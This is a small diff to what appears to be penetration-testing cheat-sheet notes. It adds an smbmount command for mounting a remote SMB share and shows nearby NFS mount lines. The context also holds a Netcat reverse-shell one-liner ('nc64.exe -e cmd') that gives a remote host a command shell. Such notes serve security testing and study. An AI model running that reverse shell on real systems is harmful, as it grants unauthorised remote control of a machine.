@@ -31,6 +31,14 @@ mkdir /tmp/<foldername?
 mount -t nfs <ip>:/<mount-folder> /tmp/<foldername>
 ```
 
+### Using `smbmount`
+
+```text
+smbmount //$IP/$share /mnt/remote/ -o username=$user,password=$pass,rw
+```
+
+Where `/mnt/remote` is the local folder to mount the share to.
+
 ## Unsorted
 
 Netcat reverse shell \(after uploading the binary!\): `nc64.exe -e cmd <ip port>`
